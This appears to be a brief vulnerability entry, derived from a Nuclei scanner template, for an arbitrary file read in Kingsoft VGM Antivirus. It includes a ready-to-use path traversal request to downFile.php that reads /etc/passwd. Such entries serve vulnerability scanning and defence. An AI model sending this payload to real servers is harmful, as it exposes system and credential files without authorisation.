# Vulnerability: Kingsoft VGM Antivirus - Arbitrary File Read
**Classification:** KINGSOFT
**Source:** Nuclei Template (`kingsoft-vgm-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in Kingsoft Antivirus. An attacker can obtain any file on the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/downFile.php?filename=../../../../etc/passwd
```

